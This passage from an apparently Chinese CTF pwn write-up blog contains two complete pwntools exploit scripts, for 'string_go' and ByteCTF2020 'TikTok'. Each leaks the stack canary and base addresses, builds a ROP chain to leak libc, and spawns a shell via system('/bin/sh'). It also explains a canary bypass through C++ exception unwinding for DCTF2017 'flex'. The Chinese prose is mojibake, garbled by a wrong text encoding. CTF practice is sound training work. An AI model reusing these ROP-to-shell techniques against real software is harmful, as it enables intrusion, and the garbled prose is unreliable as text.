<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./string_go&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./string_go&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x23A9)\nc\n&quot;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br><br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;\x01&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>rc(<span class="hljs-number">0x18</span>)<br>data1 = rc(<span class="hljs-number">0x18</span>)<br>canary = u64(rc(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;canary&quot;</span>,canary)<br><br>rc(<span class="hljs-number">8</span>)<br>elf_base = u64(rc(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x1760</span><br>leak(<span class="hljs-string">&quot;elf_base&quot;</span>,elf_base)<br><br>pop_rdi = <span class="hljs-number">0x0000000000003cf3</span> + elf_base<br>main = elf_base + <span class="hljs-number">0x24bd</span><br><br>data2 = rc(<span class="hljs-number">0x18</span>)<br>p.recv()<br>payload = <span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + \<br>          p64(pop_rdi) + p64(elf_base + elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]+elf_base) + p64(main)<br>sl(payload)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;-7&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;\x01&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + \<br>          p64(elf_base + <span class="hljs-number">0x00000000000014ce</span>)+ p64(pop_rdi)+ p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))) + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="ByteCTF2020-TikTok"><a href="#ByteCTF2020-TikTok" class="headerlink" title="ByteCTF2020 TikTok"></a>ByteCTF2020 TikTok</h2><p>Âú®A3üë¥ÂçöÂÆ¢‰∏≠ÊâæÂà∞ÁöÑÈ¢òÔºåC++ÈÄÜÂêëÂ∞±ÊòØÂá∫ÁîüÁöÑÂ§™Èò≥ÔºåÈÄºÊ†∑ÁöÑÊôöÊÑè„ÄÇ</p>
<p>È¢òÁõÆ‰∏ÄÊâìÂºÄÔºåÊ•ΩÔºåÁúü‰ºöÊï¥Ê¥ª</p>
<p><img src="/img/C++/5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ÂäüËÉΩÂ§öÁöÑ‰∏ÄÊâπÔºå‰∫éÊòØüë¥Â∞±Âã§Âã§ËÇØËÇØÊääÊâÄÊúâÂäüËÉΩÈÉΩÂÜô‰∫ÜÔºåÁªìÊûúüë¥Âú®deleteÔºåËæìÂÖ•ÂØÜÁ†ÅÁöÑÊó∂ÂÄôÔºåÂèëÁé∞ÂØÜÁ†ÅËæìÂÖ•ÈîôËØØÁõ¥Êé•ÊääÊ†àÈáåÈù¢ÁöÑÊï∞ÊçÆÂ∏¶Âá∫Êù•‰∫ÜÔºåüë¥Â∞±Áü•ÈÅìËøôÊääÊúâ‰∫Ü„ÄÇÂõ†‰∏∫deleteËøô‰∏™ÂäüËÉΩÊúâÂá†‰∏™Ëä±Êåá‰ª§Ôºå‰∏çËÉΩÂÇªÁìúcreate functionÔºåÁúã‰∏ç‰∫Ü‰º™‰ª£Á†Å„ÄÇ‰∫éÊòØüë¥ËøõgdbÁúãÂà∞‰∫ÜmemcpyÔºåÁîöËá≥ËæìÂÖ•Èîô‰ΩçËøòÊúâËæìÂá∫Ôºå‰∫∫ËøòÊÄ™Â•ΩÁöÑ„ÄÇÈÇ£Â∞±ÊòØÊ≥ÑÈú≤Êï∞ÊçÆÂêéÊ†àÊ∫¢Âá∫ÔºåÂíåÂâç‰∏ÄÈ¢ò‰∏ÄÊ†∑ÁöÑÂ•óË∑Ø„ÄÇ</p>
<p>ÔºàÊâÄ‰ª•Ëøô‰πàÂ§öfuction‰Ω†ÊòØ‰∏ÄÁÇπÊ≤°Áî®ÂïäÔºâ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./tiktok&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./tiktok&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>menu = <span class="hljs-string">b&#x27;$ &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">password</span>):<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>,password)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">sex,<span class="hljs-built_in">type</span>,age,name</span>):<br>    payload = <span class="hljs-string">b&#x27;Add &#x27;</span><br>    payload += sex + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += <span class="hljs-built_in">type</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += <span class="hljs-built_in">str</span>(age).encode() + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += name<br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">sex</span>):<br>    payload = <span class="hljs-string">b&#x27;Show&#x27;</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += sex<br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    payload = <span class="hljs-string">b&#x27;Info &#x27;</span> + <span class="hljs-built_in">id</span><br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    payload = <span class="hljs-string">b&#x27;Delete &#x27;</span> + <span class="hljs-built_in">id</span><br>    sla(menu, payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    payload = <span class="hljs-string">b&#x27;Convert &#x27;</span> + <span class="hljs-built_in">id</span><br>    sla(menu, payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,name</span>):<br>    payload = <span class="hljs-string">b&#x27;Edit &#x27;</span><br>    payload += <span class="hljs-built_in">id</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += name<br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">follow</span>(<span class="hljs-params">action,id1,id2</span>):<br>    payload = <span class="hljs-string">b&#x27;Follow &#x27;</span><br>    payload += action + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += id1 + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += id2 + <span class="hljs-string">b&#x27; &#x27;</span><br>    sla(menu, payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clone</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,name</span>):<br>    paylaod = <span class="hljs-string">b&#x27;Clone &#x27;</span><br>    paylaod += <span class="hljs-built_in">id</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    paylaod += name<br>    sla(menu,paylaod)<br><br>login(<span class="hljs-string">b&#x27;TikTokAdmin&#x27;</span>)<br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">9</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">9</span>)<br>canary = u64(rc(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;canary&quot;</span>,canary)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(canary))<br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>stack_value1 = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack_value1&quot;</span>,stack_value1)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(canary) + p64(stack_value1))<br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>stack_value2 = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack_value2&quot;</span>,stack_value2)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(canary) + p64(stack_value1) + p64(stack_value2))<br><br>elf_base = stack_value2 - <span class="hljs-number">0x39a0</span><br>pop_rdi = elf_base + <span class="hljs-number">0x000000000000ea73</span><br>main = elf_base + <span class="hljs-number">0x49f3</span><br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>stack_value3 = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack_value2&quot;</span>,stack_value3)<br>payload = p64(canary) + p64(stack_value1) + p64(stack_value2) + p64(stack_value3) + \<br>          p64(pop_rdi) + p64(elf_base + elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf_base + elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(main)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + payload)<br><br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br><br>login(<span class="hljs-string">b&#x27;TikTokAdmin&#x27;</span>)<br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>payload = p64(canary) + p64(stack_value1) + p64(stack_value2) + p64(stack_value3) + \<br>          p64(elf_base + <span class="hljs-number">0x00000000000096c3</span>) + p64(pop_rdi) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))) + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="DCTF2017-flexü§™"><a href="#DCTF2017-flexü§™" class="headerlink" title="DCTF2017 flexü§™"></a>DCTF2017 flexü§™</h2><p>‰Ωú‰∏∫‰∏Ä‰∏™Ê≤°ÊâìËøáOIÔºåÊõ¥‰∏ç‰ºöC++ÁöÑËíªÁ¨±ÔºåÂºÇÂ∏∏Â§ÑÁêÜËøôÁé©ÊÑèÁõ¥Êé•Ê∂âÂèäÂà∞Á¨îËÄÖÁõ≤Âå∫‰∫Ü„ÄÇ</p>
<p>È¶ñÂÖàËøôÈ¢ò‰∏çËÉΩËØ¥ÊòØ‰∏Ä‰∏™Á∫ØÁßçÁöÑC++ pwnÈ¢òÔºåÂè™ËÉΩËØ¥ÊòØ‰∏Ä‰∏™CÂíåC++ÁöÑ<del>ÊùÇÁßç</del>ÊùÇ‰øÆ~~</p>
<p>IDAÊâìÂºÄÔºåÈÄâÈ°π4ÂæàËØ±‰∫∫Ôºå‰ΩÜ‰ªîÁªÜ‰∏ÄÁúãÂü∫Êú¨‰∏äÂà©Áî®‰∏ç‰∫ÜÔºåÈöæÂèóÔºåÂ∞±ÂÉèÊâì‰∫ÜËÑöÊ≤°üêçÂá∫Êù•‰∏ÄÊ†∑ÈöæÂèóüò∞</p>
<p>ÁÑ∂ÂêéÈÄâÈ°π3ÊòØ‰∏™FWÔºåüë¥Âè™ËÉΩÁúãfunction1&amp;2‰∫Ü</p>
<p><img src="/img/C++/6.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ÂæàÊòéÊòæÁöÑË¥üÊï∞Ê∫¢Âá∫ÔºåÁÑ∂ÂêéÂèØ‰ª•Ê†àÊ∫¢Âá∫ÂòøÂòøÂòøÔºå‰ΩÜÊòØËøôÁé©ÊÑèÊúâ‰∏™canaryÔºåbadÔºåËøôÊØîüêç‰∏çÂá∫Êù•ËøòË¶ÅÈöæÂèóü•µ</p>
<p>‰ΩÜÊòØÂæàÊòéÊòæËøô‰∏™funcÈáåÂ≠òÂú®Â•áÊÄ™ÁöÑ‰∏úË•øÔºåthrowÔºåüë¥ÊÑüËßâËøôÁé©ÊÑèÊúâÈóÆÈ¢òÔºå‰ΩÜÊòØüë¥8Áü•ÈÅìÂì™ÈáåÊúâÈóÆÈ¢ò„ÄÇ</p>
<p><img src="/img/C++/7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>Êë∏‰∏çÂá∫Êù•ÁöÑüë¥Âè™ËÉΩÂéªÁΩë‰∏äÂÜ≤Êµ™ÔºåÂçëÂæÆÁöÑÁ™ùÂú®Èò¥ÊöóÁöÑ‰∏ãÊ∞¥ÈÅìÈáåËØªÁùÄÂ§ßË∑å‰ª¨ÁöÑwp</p>
<p>ÁÑ∂Âêéüë¥ÊòéÁôΩÂï¶</p>
<h3 id="ÂºÇÂ∏∏Â§ÑÁêÜÊú∫Âà∂"><a href="#ÂºÇÂ∏∏Â§ÑÁêÜÊú∫Âà∂" class="headerlink" title="ÂºÇÂ∏∏Â§ÑÁêÜÊú∫Âà∂"></a>ÂºÇÂ∏∏Â§ÑÁêÜÊú∫Âà∂</h3><p>try„ÄÅthrow„ÄÅcatchËøô‰∏â‰∏™ÂçßÈæôÂá§ÈõèÊÄªÊòØ‰∏ÄËµ∑Âá∫Áé∞</p>
<p>ThrowÊäõÂá∫ÂºÇÂ∏∏Ôºåtry ÂåÖÂê´ÂºÇÂ∏∏Ê®°ÂùóÔºåcatch ÊçïÊçâÊäõÂá∫ÁöÑÂºÇÂ∏∏</p>
<p>ÂΩìÁ®ãÂ∫èthrow‰∏Ä‰∏™ÂºÇÂ∏∏ÁöÑÊó∂ÂÄôÔºåÂü∫Êú¨ÊµÅÁ®ãÊòØËøôÊ†∑ÁöÑÂñµ</p>
<p>1„ÄÅË∞ÉÁî® __cxa_allocate_exception ÂáΩÊï∞ÔºåÂàÜÈÖç‰∏Ä‰∏™ÂºÇÂ∏∏ÂØπË±°„ÄÇ</p>
<p><img src="/img/C++/8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>2„ÄÅË∞ÉÁî® __cxa_throw ÂáΩÊï∞ÔºåËøô‰∏™ÂáΩÊï∞‰ºöÂ∞ÜÂºÇÂ∏∏ÂØπË±°ÂÅö‰∏Ä‰∫õÂàùÂßãÂåñ„ÄÇ</p>
<p><img src="/img/C++/9.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>3„ÄÅ__cxa_throw() Ë∞ÉÁî® _Unwind_RaiseException() ‰ªéËÄåÂºÄÂßã unwindÔºàunwind‚ÄúÂõûÈÄÄ‚ÄùÊòØ‰º¥ÈöèÂºÇÂ∏∏Â§ÑÁêÜÊú∫Âà∂ÂºïÂÖ• C++ ‰∏≠ÁöÑ‰∏Ä‰∏™Êñ∞Ê¶ÇÂøµÔºå‰∏ªË¶ÅÁî®Êù•Á°Æ‰øùÂú®ÂºÇÂ∏∏Ë¢´ÊäõÂá∫„ÄÅÊçïËé∑Âπ∂Â§ÑÁêÜÂêéÔºåÊâÄÊúâÁîüÂëΩÊúüÂ∑≤ÁªìÊùüÁöÑÂØπË±°ÈÉΩ‰ºöË¢´Ê≠£Á°ÆÂú∞ÊûêÊûÑÔºåÂÆÉ‰ª¨ÊâÄÂç†Áî®ÁöÑÁ©∫Èó¥‰ºöË¢´Ê≠£Á°ÆÂú∞ÂõûÊî∂„ÄÇÔºâ„ÄÇ</p>
<p><img src="/img/C++/10.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>4„ÄÅ_Unwind_RaiseException() ÂØπË∞ÉÁî®Èìæ‰∏äÁöÑÂáΩÊï∞ËøõË°å unwind Êó∂ÔºåË∞ÉÁî® personality routine„ÄÇ</p>
<p>5„ÄÅÂ¶ÇÊûúËØ•ÂºÇÂ∏∏Â¶ÇËÉΩË¢´Â§ÑÁêÜ(ÊúâÁõ∏Â∫îÁöÑ catch)ÔºåÂàô personality routine ‰ºö‰æùÊ¨°ÂØπË∞ÉÁî®Èìæ‰∏äÁöÑÂáΩÊï∞ËøõË°åÊ∏ÖÁêÜ„ÄÇ</p>
<p>6„ÄÅ_Unwind_RaiseException() Â∞ÜÊéßÂà∂ÊùÉËΩ¨Âà∞Áõ∏Â∫îÁöÑcatch‰ª£Á†Å„ÄÇ</p>
<p>ÁÑ∂Âêéüë¥Â∞±ÂèëÁé∞ÂºÇÂ∏∏Â§ÑÁêÜÂêéüë¥Â∞±Êù•Âà∞‰∫Ü‰∏Ä‰∏™Â•áÊÄ™ÁöÑÂú∞Êñπ</p>
<p><img src="/img/C++/11.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>‰ªîÁªÜ‰∏ÄÁúãÔºåÊ¨∏ÔºåÂéüÊù•function1ÈáåÁöÑtryÂíåcatchÊ®°ÂùóÂèçÁºñËØëÊó∂Âπ∂Ê≤°ÊúâÂá∫Êù•„ÄÇ</p>
<p>ÈÇ£Ëøô‰πà‰∏ÄËØ¥Ôºåüë¥‰ªéÂ≠ôÂ≠êÂáΩÊï∞Ë∑≥Âà∞‰∫ÜÂÑøÂ≠êÂáΩÊï∞Âπ∂‰∏îÊ≤°ÊúâÁªèËøácanaryÁöÑcheckÔºåwinÔºÅÔºÅ</p>
<p>ÈÇ£‰πàÈóÆÈ¢òÊù•‰∫ÜÔºåËØ•ÊÄé‰πàÈ£üÁî®Ëøô‰∏™ÊºèÊ¥ûÊçè„ÄÇ</p>
<p>6Âπ¥ÂâçÁàπÁàπ‰ª¨ÁöÑÊÄùË∑ØÊòØÔºöÂ¶ÇÊûúÂºÇÂ∏∏Ë¢´‰∏ä‰∏Ä‰∏™ÂáΩÊï∞ÁöÑcatchÊçïËé∑ÔºåÊâÄ‰ª•rbpÂèòÊàê‰∫Ü‰∏ä‰∏Ä‰∏™ÂáΩÊï∞ÁöÑrbpÔºå ËÄåÈÄöËøáÊûÑÈÄ†‰∏Ä‰∏™payloadÊää‰∏ä‰∏Ä‰∏™ÂáΩÊï∞ÁöÑrbp‰øÆÊîπÊàêstack_pivotÂú∞ÂùÄÔºå ‰πãÂêé‰∏ä‰∏Ä‰∏™ÂáΩÊï∞ËøîÂõûÁöÑÊó∂ÂÄôÊâßË°åleave retÔºåËøôÊ†∑‰∏ÄÊù•Êàë‰ª¨Â∞±ËÉΩÊàêÂäüÁªïËøácanaryÁöÑÊ£ÄÊü•ËÄå‰∏îËøõ‰∏ÄÊ≠•Êàë‰ª¨‰πüËÉΩÊéßÂà∂eipÔºåÔºåÂéªÊâßË°å‰∫Üstack_pivot‰∏≠ÁöÑrop‰∫Ü„ÄÇ</p>
<p>Â¶ôÔºåÂÆûÂú®ÊòØÂ¶ôÂïä„ÄÇ</p>
<p>PSÔºöËøîÂõûÂú∞ÂùÄ‰∏ÄÂÆöË¶ÅÂ°´tryÂíåcatch‰πãÈó¥ÁöÑÂú∞ÂùÄÔºàÂè™ÊúâËøôÊ†∑ÊâçËÉΩË¢´ÊçïËé∑ÂºÇÂ∏∏Ôºâ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td 